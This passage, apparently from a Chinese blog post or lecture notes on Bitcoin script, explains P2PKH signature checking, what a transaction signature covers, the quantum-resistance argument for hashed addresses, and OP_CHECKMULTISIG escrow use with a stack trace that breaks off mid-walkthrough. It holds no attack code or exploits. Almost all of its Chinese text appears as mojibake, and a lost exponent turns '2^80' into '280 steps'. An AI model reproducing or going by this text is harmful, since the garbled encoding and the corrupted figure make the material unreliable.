<p>æœ€åä¸€æ¡æŒ‡ä»¤æ˜¯OP_CHECKSIGå…¥æ ˆï¼Œå¯¹æ ˆä¸­çš„ä¸¤ä¸ªå…ƒç´ è¿›è¡Œæ£€æŸ¥ï¼Œå½“å‰æ ˆä¸­çš„æ•°æ®å®é™…å°±æ˜¯Bobçš„è¾“å…¥ä¸­æä¾›çš„å®Œæ•´å…¬é’¥å’Œå¯¹åº”ç§é’¥çš„ç­¾åï¼Œå¦‚æœéªŒè¯é€šè¿‡åˆ™Trueå…¥æ ˆã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233018.jpg" alt="img"></p>
<p>ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªæ­£ç¡®çš„Pay-to-PubKeyHashï¼ˆP2PKHï¼‰çš„ä¾‹å­ã€‚</p>
<p>å¦å¤–è¦æ³¨æ„ä¸€ç‚¹ç»†èŠ‚å°±æ˜¯å¦‚ä½•ä½¿ç”¨å…¬é’¥æ¥éªŒè¯ç­¾åã€‚ä¹Ÿå³ï¼Œè¿™ä¸ªç­¾åæ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿç­¾åæ˜¯å¯¹ä»€ä¹ˆçš„ç­¾åï¼Ÿæˆ‘ä»¬çŸ¥é“ç­¾åå®é™…ä¸Šå°±æ˜¯ä½¿ç”¨ç§é’¥å¯¹ä¸€æ®µæ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼Œé‚£è¿™é‡Œçš„æ˜æ–‡æ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œçš„é—®é¢˜æ˜¯ï¼Œé¦–å…ˆï¼Œè¿™æ®µæ˜æ–‡æ˜¯çŸ¿å·¥èƒ½å¤Ÿè®¿é—®çš„ï¼Œä¸ç„¶æ— æ³•éªŒè¯ï¼›å…¶æ¬¡ï¼Œ<strong>è¿™æ®µæ˜æ–‡å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œä¸ç„¶Bobä¹‹å‰çš„ç­¾åå¯èƒ½è¢«æ”»å‡»è€…å¤åˆ¶è¿›è¡Œé‡æ”¾ã€‚</strong> è¦ç¡®ä¿è¿™ç¬”äº¤æ˜“è°éƒ½ä¸æ³•ç¯¡æ”¹ï¼ˆçŸ¿å·¥å¯èƒ½ä¼šç¯¡æ”¹ä½ çš„äº¤æ˜“å†…å®¹ï¼ŒæŠŠæ”¶é’±çš„åœ°å€è®¾ç½®ä¸ºè‡ªå·±çš„ï¼‰ã€‚</p>
<p>è¿™é‡Œç­”æ¡ˆå°±æ˜¯æ•´ä¸ªäº¤æ˜“Tx2ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233019.jpg" alt="img"></p>
<p>ç¡®åˆ‡åœ°è¯´ï¼Œå°±æ˜¯äº¤æ˜“Tx2çš„é™¤äº†ç­¾åéƒ¨åˆ†ä¹‹å¤–çš„å†…å®¹ï¼ˆå¯ä»¥é€šè¿‡æ ‡å¿—ä½å¯¹è¿›è¡Œç­¾åçš„äº¤æ˜“å†…å®¹è¿›è¡Œç®€åŒ–ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä½¿ç”¨pubkey Scriptæ›¿ä»£Signatureåšå¡«å……ï¼‰ã€‚ä¸Šå›¾å…±æœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼Œä¸­é—´æ˜¯Signed Dataï¼Œä¹Ÿå³è¢«ç­¾åçš„æ•°æ®ã€‚ä¸Šéƒ¨æ˜¯Tx1å’ŒBobè‡ªå·±çš„æ•°æ®ï¼Œä¸‹éƒ¨åˆ†æ˜¯Bobæœ€ç»ˆå½¢æˆçš„Tx2ã€‚ä»ä¸Šéƒ¨åˆ†å’Œä¸­é—´éƒ¨åˆ†å½¢æˆäº†ä¸‹éƒ¨ã€‚ï¼ˆç­¾åçš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼ŒTx2çš„æ˜æ–‡éƒ¨åˆ†ä¹Ÿä¸èƒ½è¢«æ”»å‡»è€…éšæ„ç¯¡æ”¹ï¼‰</p>
<p>æ›´å¤šç»†èŠ‚å¯ä»¥å‚è€ƒ<a href="https://link.zhihu.com/?target=https://bitcoin.stackexchange.com/questions/3374/how-to-redeem-a-basic-tx">How to redeem a basic Tx?</a></p>
<p>ä»¥åŠ<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/OP_CHECKSIG">OP_CHECKSIG - Bitcoin Wiki</a></p>
<p>æœ€åï¼Œæœ‰ä¸¤ä¸ªé—®é¢˜å¯ä»¥è®¨è®ºä¸€ä¸‹ï¼š</p>
<ol>
<li>åœ¨éªŒè¯è¿‡ç¨‹ä¸­ï¼Œæœ€åä¸€æ­¥OP_CHECKSIGçš„è¾“å…¥å®é™…ä¸Šå°±æ˜¯åœ¨æ–°äº¤æ˜“ä¸­Bobæä¾›çš„scriptSigçš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œæœ€åä¸€æ­¥çš„éªŒè¯ä¹Ÿå°±æ˜¯åœ¨éªŒè¯Bobçš„ç§é’¥ã€‚é‚£ä¸­é—´è¿˜æœ‰é‚£ä¹ˆå¤šæ­¥éª¤èƒ½ä¸èƒ½çœç•¥å‘¢ï¼Ÿ</li>
</ol>
<p>ã€ä¸€äº›åŒå­¦ä¼šè®¤ä¸ºï¼ŒBobå¿…é¡»æä¾›ä¸€ä¸ªåœ°å€ï¼Œä½¿å¾—å…¶å“ˆå¸Œå€¼ç­‰äºå‰äº¤æ˜“ä¸­æŒ‡å®šçš„å€¼ï¼›ä½†æ˜¯å¦‚æœè¿™ä¸ªåœ°å€ä¹‹å‰ä½¿ç”¨è¿‡ï¼Œä»»ä½•äººéƒ½å¯ä»¥æä¾›è¿™ä¸ªåœ°å€ã€‚ã€‘</p>
<ol start="2">
<li>åœ¨å¼•å…¥æ¯”ç‰¹å¸åœ°å€ï¼ˆå…¬é’¥çš„å“ˆå¸Œï¼‰ä¹‹å‰ï¼Œæ—©æœŸçš„æ¯”ç‰¹å¸ç‰ˆæœ¬æ”¯æŒp2pkå½¢å¼çš„äº¤æ˜“ï¼Œä¹Ÿå³pay-to-public-keyã€‚è¿™ç§äº¤æ˜“çš„ç¼ºç‚¹æ˜¯éœ€è¦æå‰çŸ¥é“å…¬é’¥ï¼Œè€Œä¸”é’ˆå¯¹æ”»å‡»çš„ä¿æŠ¤æ€§è¾ƒå·®ã€å¦‚æœä¸€ä¸ªåœ°å€åªç”¨ä¸€æ¬¡ï¼Œé‚£ä¹ˆP2PKHçš„è¯æ²¡æœ‰äººæå‰çŸ¥é“å…¬é’¥ã€‘ã€‚é—®é¢˜æ˜¯ï¼šè¿™ç§äº¤æ˜“çš„scriptSigå’ŒscriptPubKeyåº”è¯¥æ€ä¹ˆå†™ï¼Ÿ</li>
</ol>
<hr>
<p>å…³äºp2pkå’Œp2pkhï¼Œè¯¾åæœ‰åŒå­¦é—®ï¼Œä¸ºå•¥æ²¡æœ‰äººæå‰çŸ¥é“å…¬é’¥ä¼šæ›´å®‰å…¨ï¼Ÿå‚è€ƒ4æä¾›äº†ä¸€ä¸ªè§£é‡Šï¼š</p>
<p>åœ¨æ¯”ç‰¹å¸ä½¿ç”¨çš„æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•åŠ å¯†ç³»ç»Ÿé‡Œé¢ï¼Œä¸€ä¸ªå…¬é’¥æœ‰512ä½é•¿åº¦ï¼Œæ„å‘³ç€å®ƒéœ€è¦æ¥è¿‘100ä¸ªå­—ç¬¦æ¥å‘ˆç°ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå…¬é’¥ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">04b52fd5a616a8f08ccad58469102f86fc7891e5aa4262ab8d43e41767c17d45b80850044a62af51783609176daf02fc46221057a8de11ee6ae8743065b27a4b5e</span><br></pre></td></tr></table></figure>

<p>å®ƒå¯¹åº”çš„åå…­è¿›åˆ¶å½¢å¼çš„æ¯”ç‰¹å¸åœ°å€å¦‚ä¸‹ï¼š </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">4b463093e6fc3135a4de2ff577c4b658198777a9</span><br></pre></td></tr></table></figure>

<p>äººä»¬æ›´åŠ ç†Ÿæ‚‰çš„base58ç¼–ç å½¢å¼çš„æ˜¯ï¼š </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1obodiqhAZ3GD9onBXRZ9v7hshkuBreCu</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œï¼Œåœ¨ç°å®é‡Œï¼Œæœ‰ä¸€ç§ä»¥æ›´ç´§å‡‘çš„å½¢å¼ç¼–ç å…¬é’¥çš„æ–¹æ³•ï¼Œåªéœ€è¦257ä¸ªå­—èŠ‚ï¼ˆè¯‘è€…æ³¨ï¼šè¿™é‡Œå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œåº”å½“æ˜¯257ä½ï¼Œå‚è§æ­¤æ–‡<a href="https://link.zhihu.com/?target=http://618.io/blog/2013/07/30/bitcoin-basic/">http://618.io/blog/2013/07/30/bitcoin-basic/</a>ï¼‰ï¼š </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">03c5c9833d00bed3211a5f3733316ecf6ebc407806d70caa14862f1e2e8c2f852d</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬å†³å®šæŠŠå®ƒå˜æˆbase58ç¼–ç çš„å½¢å¼ï¼š </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">15sqRCowBDTfyuxPQD3ba8sN3wBB8MwGbo6gsBEGeKmUbNQADGh</span><br></pre></td></tr></table></figure>

<p>æ¯”æˆ‘ä»¬å¦‚ä»Šä½¿ç”¨çš„åœ°å€ä¹Ÿæ²¡é•¿å¤šå°‘ã€‚æ‰€ä»¥ä¸­æœ¬èªçš„é€‰æ‹©ã€p2pkhæ˜¯ä¸­æœ¬èªåšå‡ºçš„é€‰æ‹©ã€‘åªæ˜¯å¸¦æ¥äº†ä¸å¿…è¦çš„å¤æ‚åº¦å’Œæµªè´¹å—ï¼Ÿ</p>
<p>æœ€åè¯æ˜ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚æœ‰å¦å¤–ä¸€ä¸ªéå¸¸å¥½çš„ç†ç”±å»ä½¿ç”¨è¿™ä¸ªâ€œå…¬é’¥çš„å“ˆå¸Œå€¼â€çš„åœ°å€ç»“æ„ï¼šé‡å­åŠ å¯†æŠ€æœ¯ã€‚é‡å­è®¡ç®—æœºå¯ä»¥ç ´è§£æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œç»™å®šä¸€ä¸ªå…¬é’¥ï¼Œé‡å­è®¡ç®—æœºå¯ä»¥ç›¸å½“å¿«é€Ÿçš„æ‰¾åˆ°å¯¹åº”çš„ç§é’¥ï¼‰ï¼Œä½†å®ƒä»¬ä¸èƒ½ç›¸ç±»ä¼¼çš„é€†è½¬å“ˆå¸Œç®—æ³•ï¼ˆæˆ–è€…è¯´ä»–ä»¬å¯ä»¥ï¼Œä½†æ˜¯å°†éœ€è¦èŠ±æ‰280ä¸ªæ­¥éª¤æ¥å®Œæˆä¸€ä¸ªæ¯”ç‰¹å¸åœ°å€çš„ç ´è§£ï¼Œè¿™ä»ç„¶æ˜¯ç›¸å½“ä¸å¯è¡Œçš„ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœä½ çš„æ¯”ç‰¹å¸èµ„é‡‘å­˜æ”¾åœ¨ä¸€ä¸ªä½ æ²¡æœ‰æ”¯å‡ºè¿‡çš„åœ°å€é‡Œï¼ˆè¿™æ„å‘³ç€å…¬é’¥æ˜¯æ²¡æœ‰å…¬å¼€çš„ï¼‰ï¼Œå®ƒä»¬åœ¨é‡å­è®¡ç®—æœºé¢å‰ä¹Ÿå°±æ˜¯å®‰å…¨çš„ã€‚æœ‰ç†è®ºä¸Šçš„é€”å¾„å¯ä»¥è®©æ¯”ç‰¹å¸å®Œå…¨å…äºé‡å­è®¡ç®—æœºçš„å¨èƒï¼Œä½†ä¸€ä¸ªåœ°å€åªæ˜¯ä¸€ä¸ªå…¬é’¥çš„å“ˆå¸Œå€¼çš„äº‹å®ï¼Œæ„å‘³ç€ä¸€æ—¦é‡å­è®¡ç®—æœºçœŸçš„å‡ºç°äº†ï¼Œåœ¨æˆ‘ä»¬å…¨é¢åˆ‡æ¢ä¹‹å‰æ”»å‡»è€…å¯ä»¥é€ æˆçš„æŸå¤±è¦å°å¾—å¤šã€‚</p>
<p>ã€è‡³äºä¸ºå•¥é‡å­è®¡ç®—å¯ä»¥ç ´è§£ECCä½†æ˜¯ä¸èƒ½ä¸èƒ½é€†è½¬å“ˆå¸Œï¼Œéœ€è¦è¿›ä¸€æ­¥çš„åˆ†æäº†ã€‘</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=http://8btc.com/article-4382-1.html">æ·±å…¥ç†è§£æ¯”ç‰¹å¸äº¤æ˜“çš„è„šæœ¬ - æ–°æ‰‹å…¥é—¨</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23transactions">https://bitcoin.org/en/developer-guide#transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Transaction">Transaction - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://m.8btc.com/article/5340">https://m.8btc.com/article/5340</a></p>
</li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯8-æ¯”ç‰¹å¸çš„æœºåˆ¶-2"><a href="#åŒºå—é“¾æŠ€æœ¯8-æ¯”ç‰¹å¸çš„æœºåˆ¶-2" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯8:æ¯”ç‰¹å¸çš„æœºåˆ¶(2)"></a>åŒºå—é“¾æŠ€æœ¯8:æ¯”ç‰¹å¸çš„æœºåˆ¶(2)</h1><h2 id="OP-CHECKMULSIG"><a href="#OP-CHECKMULSIG" class="headerlink" title="OP_CHECKMULSIG"></a>OP_CHECKMULSIG</h2><p>å’ŒOP_CHECKSIGç›¸æ¯”ï¼ŒOP_CHECKMULSIGå¤šäº†ä¸ªMULï¼Œä¹Ÿå³å®ƒéœ€è¦æ£€æŸ¥å¤šä¸ªç­¾åã€‚è¿™ä¸ªæŒ‡ä»¤å¹¶ä¸æ˜¯æ¯”ç‰¹å¸è®¾è®¡ä¹‹åˆå°±æœ‰çš„ï¼Œè€Œæ˜¯åœ¨2011å¹´çš„BIPï¼ˆbitcoin  improvement protocolï¼‰ä¸­æå‡ºçš„ï¼ˆè¯¦è§å‚è€ƒ1ï¼‰ã€‚</p>
<p>æå‡ºè¯¥æŒ‡ä»¤çš„ç›®çš„æ˜¯ä½¿èƒ½å®‰å…¨é’±åŒ…ã€æ‰˜ç®¡äº¤æ˜“ã€ä»¥åŠå…¶ä»–éœ€è¦å¤šäºä¸€ä¸ªç­¾åçš„ä½¿ç”¨æƒ…å†µã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨çš„ä¾‹å­åŒ…æ‹¬ï¼š</p>
<ul>
<li>ä½¿ç”¨WPSï¼ˆwallet protection serviceï¼‰ä¿æŠ¤çš„é’±åŒ…ã€‚è­¬å¦‚éœ€è¦2-of-2çš„ç­¾åçš„äº¤æ˜“ï¼Œå…¶ä¸­ä¸€ä¸ªç­¾åæ¥è‡ªäºå®‰è£…äº†é’±åŒ…çš„ï¼ˆå¯èƒ½ä¸å®‰å…¨çš„ï¼‰ç”µè„‘ï¼Œå¦ä¸€ä¸ªç­¾åæ¥è‡ªWPSã€‚å½“å‘é€å—ä¿æŠ¤çš„æ¯”ç‰¹å¸æ—¶ï¼Œç”¨æˆ·çš„æ¯”ç‰¹å¸å®¢æˆ·ç«¯ä¼šå°†äº¤æ˜“å‘ç»™WPSï¼ŒWPSä¼šå‘ç”¨æˆ·è¯·æ±‚ç¡®è®¤ï¼Œè­¬å¦‚ç”¨æˆ·ç¡®å®å‘èµ·äº†è¿™ä¸ªäº¤æ˜“ï¼Œä»¥åŠäº¤æ˜“çš„ç»†èŠ‚æ˜¯æ­£ç¡®çš„ã€‚ Two-factor authentication wallet - One private key is on your primary computer, the other on your smartphone â€” the funds cannot be spent without a signature from both devices. Thus, an attacker must gain access to both devices in order to steal your funds (much more difficult than one device)ã€‚Side note: customers should insist that their wallet protection service provide them with copies of the private key(s) used to secure their wallets that they can safely store off-line, so that their coins can be spent even if the WPS goes out of businessã€‚</li>
<li>ç»„ç»‡èµ„é‡‘ä½¿ç”¨ï¼š2-of-3çš„æƒ…å†µï¼Œç”±ä¸‰åè‘£äº‹ç»„æˆçš„è‘£äº‹ä¼šï¼Œä¸ºä»–ä»¬çš„ç»„ç»‡ç»´æŠ¤èµ„é‡‘-é™¤éå…¶ä¸­ä¸¤åè‘£äº‹åŒæ„ï¼Œå¦åˆ™ä¸å¾—åŠ¨ç”¨è¿™äº›èµ„é‡‘ã€‚ è¾ƒå¤§çš„ç»„ç»‡å¯ä»¥è¿›è¡Œæ›´å¤§çš„å¤šé‡ç­¾åäº¤æ˜“ï¼Œä¾‹å¦‚3-of-5, 5-of-9ç­‰ã€‚</li>
<li>ç¬¬ä¸‰æ–¹æ‰˜ç®¡æœåŠ¡ï¼ˆä¹°æ–¹ã€å–æ–¹ã€ä»¥åŠä¿¡ä»»ç¬¬ä¸‰æ–¹ Escrow transactionï¼‰ã€‚é€‚ç”¨äºéœ€è¦2-of-3ç­¾åçš„äº¤æ˜“ã€‚ä¹°æ–¹ã€å–æ–¹å’Œç¬¬ä¸‰æ–¹æ²¡äººéƒ½æä¾›å…¬é’¥ï¼Œä¹°æ–¹å°†åˆ›å»ºäº¤æ˜“ï¼Œå¹¶ä½¿ç”¨2-of-3 CHECKMULTISIGï¼Œç„¶åå°†äº¤æ˜“IDå‘é€ç»™å–æ–¹å’Œç¬¬ä¸‰æ–¹ã€‚å–æ–¹å±¥è¡Œè‡ªå·±çš„è´£ä»»ï¼Œç„¶åè¦æ±‚ä¹°æ–¹å…±åŒç­¾åï¼Œæ‰èƒ½è·å¾—æ”¯ä»˜çš„å¸ã€‚å¦‚æœä¹°å–åŒæ–¹èµ·äº†äº‰æ‰§ï¼Œåˆ™ç¬¬ä¸‰æ–¹ä¼šå‚ä¸è¿›æ¥ï¼Œè­¬å¦‚å¦‚æœä¹°æ–¹æ”¶åˆ°è´§å´ä¸è‚¯ç­¾åï¼Œé‚£ä¹ˆç¬¬ä¸‰æ–¹å°†è¿›è¡Œç­¾åï¼Œè¿™æ ·æ»¡è¶³æ¡ä»¶ï¼Œä»è€Œå–æ–¹å¯ä»¥è·å¾—åº”å¾—çš„æŠ¥é…¬ã€‚</li>
</ul>
<p>å…³äºç¬¬ä¸‰æ–¹æ‰˜ç®¡çš„ä¾‹å­ï¼Œè¯¦ç»†æ¥è¯´ï¼Œè­¬å¦‚Aliceæƒ³è¦ä½¿ç”¨æ¯”ç‰¹å¸å‘Bobè´­ä¹°ä¸€äº›ç‰©å“ã€‚é—®é¢˜æ˜¯ï¼ŒAliceå¸Œæœ›åœ¨æ”¶åˆ°ç‰©å“ä¹‹åæ‰ä»˜é’±ï¼Œè€ŒBobå¸Œæœ›æ”¶åˆ°é’±ä¹‹åæ‰å‘è´§ã€‚è¿™æ—¶å€™å°±éœ€è¦ç¬¬ä¸‰æ–¹æ‰˜ç®¡ï¼ˆæ”¯ä»˜å®ï¼‰ã€‚è€Œç¬¬ä¸‰æ–¹æ‰˜ç®¡å¯ä»¥é€šè¿‡MultiSigæ–¹ä¾¿åœ°å®ç°ã€‚</p>
<p>Aliceå’ŒBobåŒæ„æ‰¾åˆ°ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹Carolã€‚ç„¶åAliceåˆ›å»ºäº†äº¤æ˜“ã€‚ä½†æ˜¯è¿™ä¸ªäº¤æ˜“ä¸æ˜¯ç›´æ¥å‘ç»™Bobçš„ï¼Œè€Œæ˜¯ä¸€ä¸ªMULTISIGçš„äº¤æ˜“ï¼Œéœ€è¦2-of-3çš„ç­¾åã€‚ä¹Ÿå³ï¼ŒAliceå°†è‡ªå·±çš„å¸å‘ç»™äº†ä¸€ä¸ªåœ°å€ï¼Œè¦æ±‚Aliceã€Bobä»¥åŠCarolä¸‰äººä¸­ä»»æ„ä¸¤äººçš„ç­¾åæ‰èƒ½ä½¿ç”¨è¿™ä¸ªè¾“å‡ºã€‚</p>
<p>è¿™ä¸ªäº¤æ˜“é¦–å…ˆæ˜¯æ­£å¸¸çš„äº¤æ˜“ï¼Œå› ä¸ºAliceç¡®å®æ‹¥æœ‰è¿™ä¸ªå¸ã€‚ç„¶åå¦‚æœAliceå’ŒBobéƒ½æ˜¯è¯šå®çš„ï¼Œä¹Ÿå³Bobçœ‹åˆ°Aliceåˆ›å»ºçš„äº¤æ˜“ä¹‹åä¾¿å‘è´§ï¼Œè€ŒAliceæ”¶åˆ°è´§ä¹‹åä¹Ÿæ‰¿è®¤æ”¶åˆ°è´§ï¼Œé‚£ä¹ˆä¸ºäº†ä½¿ç”¨MULTISIGäº¤æ˜“ä¸­çš„å¸ï¼Œåªè¦Aliceå’ŒBobä¸¤äººç­¾åå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„äº¤æ˜“ï¼Œè¿™ä¸ªäº¤æ˜“çš„è¾“å…¥æ˜¯MULTISIGäº¤æ˜“ä¸­çš„è¾“å‡ºï¼Œè¾“å‡ºåˆ™æ˜¯Bobçš„åœ°å€ï¼Œé‚£ä¹ˆBobå°±èƒ½è·å¾—å¸ã€‚æ­¤æ—¶ï¼Œå¹¶ä¸éœ€è¦ç¬¬ä¸‰æ–¹Carolçš„å‚ä¸ã€‚</p>
<p>å¦‚æœAliceä¸è¯šå®ï¼Œä¹Ÿå³æ”¶åˆ°è´§äº†åˆä¸æ‰¿è®¤ï¼Œæ­¤æ—¶Bobå¯ä»¥å‘Coralç”³è¯·ä»²è£ï¼Œå¦‚æœCoralç›¸ä¿¡Bobç¡®å®å‘äº†è´§ï¼Œé‚£ä¹ˆCoralå¯ä»¥å’ŒBobä¸¤äººåˆ›å»ºæ–°çš„äº¤æ˜“ï¼Œå°†å¸ä»MULTISIGäº¤æ˜“ä¸­èµå‡ºï¼Œå¹¶ä¸”è¾“å‡ºæ˜¯Bobçš„åœ°å€ã€‚è¿™æ ·Bobä¹Ÿèƒ½å¤Ÿè·å¾—å¸ã€‚å³ä½¿Aliceæƒ³æŠµèµ–ä¹Ÿä¸èƒ½æˆåŠŸã€‚</p>
<p>å¦‚æœBobä¸è¯šå®ï¼Œæ²¡æœ‰å‘è´§æˆ–è€…å‘çš„è´§ç‰©ä¸å¯¹ï¼Œé‚£ä¹ˆAliceå¯ä»¥å‘Carolç”³è¯·ä»²è£ã€‚å¦‚æœCarolç›¸ä¿¡äº†Aliceï¼Œé‚£ä¹ˆå°±å¯ä»¥å’ŒAliceä¸€èµ·ç­¾åï¼Œå°†å¸ä»MULTISIGäº¤æ˜“ä¸­èµå‡ºï¼Œå¹¶ä¸”è¾“å‡ºæ˜¯Aliceçš„åœ°å€ã€‚è¿™æ ·Aliceå°±èƒ½å¤Ÿè·å¾—é€€æ¬¾ã€‚å³ä½¿Bobæƒ³æŠµèµ–ä¹Ÿä¸èƒ½æˆåŠŸã€‚</p>
<p>ã€æ­¤æ—¶çš„Carolæ—¢ç„¶å¯ä»¥è¿›è¡Œä»²è£ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªä¸­å¿ƒåŒ–çš„æœºæ„ã€‚é‚£ä¹ˆæœ¬è´¨ä¸Šå’Œæ”¯ä»˜å®ä¹Ÿæ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ã€‘</p>
<p>ã€ç™¾åº¦ç™¾ç§‘ä¸Šçš„â€œå»ä¸­å¿ƒåŒ–â€çš„æè¿°ï¼šå»ä¸­å¿ƒåŒ–ï¼Œä¸æ˜¯ä¸è¦ä¸­å¿ƒï¼Œè€Œæ˜¯ç”±èŠ‚ç‚¹æ¥è‡ªç”±é€‰æ‹©ä¸­å¿ƒã€è‡ªç”±å†³å®šä¸­å¿ƒã€‚ç®€å•åœ°è¯´ï¼Œä¸­å¿ƒåŒ–çš„æ„æ€ï¼Œæ˜¯ä¸­å¿ƒå†³å®šèŠ‚ç‚¹ã€‚èŠ‚ç‚¹å¿…é¡»ä¾èµ–ä¸­å¿ƒï¼ŒèŠ‚ç‚¹ç¦»å¼€äº†ä¸­å¿ƒå°±æ— æ³•ç”Ÿå­˜ï¼ˆç±»ä¼¼äºæ²¡äº†æ”¯ä»˜å®å°±ä¸èƒ½ç”¨æ·˜å®ï¼Ÿï¼‰ã€‚åœ¨å»ä¸­å¿ƒåŒ–ç³»ç»Ÿä¸­ï¼Œä»»ä½•äººéƒ½æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»»ä½•äººä¹Ÿéƒ½å¯ä»¥æˆä¸ºä¸€ä¸ªä¸­å¿ƒã€‚ä»»ä½•ä¸­å¿ƒéƒ½ä¸æ˜¯æ°¸ä¹…çš„ï¼Œè€Œæ˜¯é˜¶æ®µæ€§çš„ï¼Œä»»ä½•ä¸­å¿ƒå¯¹èŠ‚ç‚¹éƒ½ä¸å…·æœ‰å¼ºåˆ¶æ€§ã€‚ã€‘</p>
<p>MULTISIGçš„è§„èŒƒå¦‚ä¸‹ï¼š</p>
<p>scriptPubKey ä¸­åŒ…æ‹¬çš„å†…å®¹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">m &#123;pubkey&#125;...&#123;pubkey&#125; n OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>

<p>mçš„å€¼å°äºæˆ–ç­‰äºnã€‚</p>
<p>OP_CHECKMULTISIGäº¤æ˜“èµå‡ºå¸æ—¶éœ€è¦å¦‚ä¸‹çš„scriptSig:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_0 ...signatures...</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œéœ€è¦OP_0æ˜¯å› ä¸ºOP_CHECKMULTISIGä¸­å­˜åœ¨Bugï¼Œå®ƒåœ¨å®ç°çš„æ—¶å€™å¤šå‡ºæ ˆäº†ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥åªå¥½ä½¿ç”¨OP_0è¿›è¡Œå¡«å……ã€‚</p>
<p>å†å…·ä½“çœ‹ä¸€ä¸‹MULTISIGçš„è¿è¡Œæƒ…å†µã€‚</p>
<p>è­¬å¦‚è¯´èµå‡ºå¸çš„äº¤æ˜“ä¸­ï¼ˆæ–°äº¤æ˜“Tx2ï¼‰çš„scriptSigæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">    0</span><br></pre></td></tr></table></figure>

<p>MultiSigäº¤æ˜“ï¼ˆTx1ï¼‰ä¸­çš„è¾“å‡ºéƒ¨åˆ†çš„scriptPubKeyæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>å½“è¿è¡Œæ—¶ï¼Œåœ¨ OP_CHECKMULTISIGæ‰§è¡Œä¹‹å‰ï¼Œæ ˆä¸­çš„æ•°æ®æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>åˆå§‹åŒ–ä¹‹åï¼Œå„ä¸ªå˜é‡è·å¾—äº†å€¼ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">ikey-&gt; (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>ç„¶åé¦–å…ˆå°è¯•ä½¿ç”¨pubKey3æ¥éªŒè¯sig2, å¾ˆæ˜æ˜¾ä¼šå¤±è´¥ï¼Œé‚£ä¹ˆå°†ikeyæœå‰èµ°ä¸€æ­¥æŒ‡å‘pubKey2ï¼Œisigä¿æŒä¸åŠ¨ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">ikey-&gt; (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨pubKey2éªŒè¯sig2æˆåŠŸäº†ï¼Œç„¶åikeyå’Œisigéƒ½å‘å‰:</p>
